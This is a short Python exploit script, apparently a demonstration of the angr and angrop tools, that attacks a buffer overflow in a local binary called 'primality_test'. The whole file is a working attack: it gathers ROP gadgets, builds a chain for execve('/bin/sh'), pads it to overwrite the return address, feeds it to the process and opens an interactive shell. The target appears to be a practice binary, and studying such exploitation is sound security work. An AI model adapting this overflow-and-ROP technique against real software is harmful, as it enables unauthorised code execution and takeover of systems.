"""
Exploit write in angr with angrop module. It build a ROP attacks for "primality_test" binary.
It highlights the potentiality and the comfortable syntax
"""

import angr
import angrop
from pwn import *

file_path = 'primality_test'
exe = ELF(file_path)  # create ELF binary

p = angr.Project(file_path)  # create angr project
rop = p.analyses.ROP()  # create ROP object
rop.find_gadgets()  # find every gadgets in binary

bin_string = 0x08048991  # address of string "/bin/sh"
chain = rop.do_syscall(11, [bin_string, 0x0, 0x0])  # build ROP chain exploiting the syscall "execve(/bin/sh)"

# print of chain string
print("ROP chain without padding:")
chain.print_payload_code()

ropchain = b'A'*(0x4c + 4) + chain.payload_str()  # generate padding for exploit the buffer overflow vulnerability

io = process([file_path])   # executing the executable with ropchain as input
io.sendlineafter(b'Enter a number: ', ropchain)  # send a single line from the communication tube
io.interactive()  # to manually interact with the spawn shell
